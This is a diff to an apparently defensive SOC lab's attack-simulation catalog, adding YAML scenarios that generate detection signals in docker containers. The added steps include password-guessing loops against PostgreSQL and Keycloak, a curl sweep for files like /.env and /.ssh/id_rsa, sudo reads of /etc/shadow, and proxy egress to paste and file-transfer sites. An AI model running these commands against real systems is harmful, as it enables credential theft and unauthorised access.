@@ -9,7 +9,7 @@
 #
 # Schema (per scenario):
 #   id: unique slug, also the run_id prefix + seed axis.
-#   category: auth-metadata | execution | data-access
+#   category: auth-metadata | execution | data-access | exfiltration
 #   description: short prose for catalog listing.
 #   source_host: default docker container to dispatch from.
 #   source_user: default identity (must exist on source_host — seeded by
@@ -28,6 +28,14 @@
 #     repeat: positive integer, or the literal string "${intensity}".
 #     delay_s_between: seconds to sleep between repeats (skipped after last).
 #     allow_fail: if true, non-zero rc does not abort the scenario.
+#
+# Retargeting: `--target` moves target_host (what ${target}/${host} expand to).
+# `--source` moves source_host (where the commands run). A scenario whose steps
+# interpolate ${target} SSHes source→target, so those two differ; a LOCAL scenario
+# (its commands act on the host they run on and never read ${target}, e.g.
+# persistence-authorized-keys, living-off-the-land, sudo-escalation-burst) retargets
+# on --source, and its story/alert only stay coherent when --source and --target name
+# the same host (the oracle-golden generator defaults --target to --source for these).
 #
 # Reproducibility: runner hashes (scenario.id, seed, step_index, iteration)
 # to seed a per-step PRNG — same seed + same catalog → same dispatches.
@@ -139,4 +147,137 @@ scenarios:
             2>&1 | head -5 || true
         repeat: "${intensity}"
         delay_s_between: 6
+        allow_fail: true
+
+  - id: postgres-cred-probe
+    category: data-access
+    description: >
+      Compromised office workstation probes db-1's PostgreSQL directly — a burst
+      of failed logins under guessed service accounts, then a data read with a
+      weak app credential. office-ws has trust_edges_out: [] so no baseline path
+      reaches the db tier, and the app's own DB traffic never fails auth; the
+      signal is the `FATAL: password authentication failed` burst in
+      logs-postgresql.log plus the off-tier SELECT. Reads ${target}, so it
+      retargets to any postgres host.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: db-1
+    default_intensity: 5
+    steps:
+      - cmd: |
+          for u in dbadmin backup pgadmin superuser reporting; do
+            PGPASSWORD=Password123 psql -h ${target} -U "$u" -d postgres \
+              -c 'SELECT 1' 2>&1 | head -1 || true
+          done
+        repeat: "${intensity}"
+        delay_s_between: 5
+        allow_fail: true
+      - cmd: |
+          PGPASSWORD=changeme psql -h ${target} -U appuser -d app \
+            -c 'SELECT count(*) FROM orders;' \
+            -c 'SELECT * FROM orders LIMIT 5;' 2>&1 | head -10 || true
+        repeat: 1
+        allow_fail: true
+
+  - id: web-path-scan
+    category: data-access
+    description: >
+      Compromised office workstation enumerates a web host for exposed admin
+      panels, dotfiles and backups — a curl sweep of ~10 sensitive paths that all
+      404. Baseline nginx traffic is health probes from 127.0.0.1 hitting two
+      paths, so the distinguishing signal is a burst of distinct url.path 404s
+      from an off-host source.ip in logs-nginx.access. Reads ${target}, so it
+      retargets to any web host.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: web-1
+    default_intensity: 1
+    steps:
+      - cmd: |
+          for path in /admin /.env /wp-login.php /api/v1/users /.git/config \
+                      /phpmyadmin /server-status /config.php /backup.sql \
+                      /.aws/credentials /actuator/health /.ssh/id_rsa; do
+            curl -sS -m 3 -o /dev/null -w "%{http_code} ${path}\n" \
+              "http://${target}${path}" 2>&1 || true
+          done
+        repeat: "${intensity}"
+        delay_s_between: 3
+        allow_fail: true
+
+  - id: sudo-escalation-burst
+    category: execution
+    description: >
+      Post-foothold interactive privilege probing on a single host — a burst of
+      sudo invocations (successful or denied) reading sensitive files. Every
+      execve of /usr/bin/sudo emits a Falco "Sudo execution" NOTICE; ≥3 on one
+      host in 10 minutes trips v2-off-hours-sudo. LOCAL scenario: the commands run
+      on the host itself, so it retargets on --source (source==target), not on
+      --target.
+    source_host: dev-ws-1
+    source_user: dev.dana
+    target_host: dev-ws-1
+    default_intensity: 4
+    steps:
+      - cmd: |
+          sudo -n id 2>&1 | head -1 || true
+          sudo -n cat /etc/shadow 2>&1 | head -1 || true
+        repeat: "${intensity}"
+        delay_s_between: 20
+        allow_fail: true
+
+  - id: keycloak-cred-stuffing
+    category: auth-metadata
+    description: >
+      Credential-stuffing against the Keycloak IdP — a burst of OIDC password
+      grants under guessed usernames with a wrong password, each raising a
+      LOGIN_ERROR in logs-keycloak.events. Baseline does not drive interactive IdP
+      logins, so the error burst stands against a near-empty window. LOCAL scenario:
+      it runs on the foothold and reaches the IdP by DNS (keycloak:8080). The IdP is
+      a service, not a host role, and its events carry host.name=soc-playground, not
+      a per-host identity — so the case names the ACTOR host and attributes by
+      ipAddress/username in the lead. Retargets on --source (source==target), not
+      --target.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: office-ws-1
+    default_intensity: 6
+    steps:
+      - cmd: |
+          for user in admin sre.alice dev.dana svc.backups operator; do
+            curl -sS -m 5 -o /dev/null -w "%{http_code} ${user}\n" \
+              -d "client_id=admin-cli" -d "grant_type=password" \
+              -d "username=${user}" -d "password=Password123!" \
+              "http://keycloak:8080/realms/soc-playground/protocol/openid-connect/token" \
+              2>&1 || true
+          done
+        repeat: "${intensity}"
+        delay_s_between: 4
+        allow_fail: true
+
+  - id: proxy-egress-burst
+    category: exfiltration
+    description: >
+      Authenticated egress through the Squid forward proxy under a compromised
+      credential — a burst of outbound GET/CONNECT to external destinations, the
+      shape of staged exfiltration or tool-download over the sanctioned proxy. Every
+      request lands in logs-squid.access attributed to user.name (the basic-auth
+      identity) with source.ip = the originating container; the destination is
+      url.original. Baseline routes no egress through the proxy, so a single
+      authenticated request already stands against an empty window. Runs FROM the
+      compromised host outward to a fixed service, so it retargets on --source (the
+      egressing host), not --target.
+    source_host: office-ws-1
+    source_user: dev.dana
+    target_host: office-ws-1
+    default_intensity: 8
+    steps:
+      - cmd: |
+          for url in https://example.com https://ifconfig.me https://transfer.sh \
+                     https://raw.githubusercontent.com https://pastebin.com \
+                     https://api.telegram.org; do
+            curl -sS -m 5 -o /dev/null -w "%{http_code} ${url}\n" \
+              -x "http://dev.dana:changeme@squid:3128" "${url}" 2>&1 || true
+          done
+        repeat: "${intensity}"
+        delay_s_between: 4
         allow_fail: true
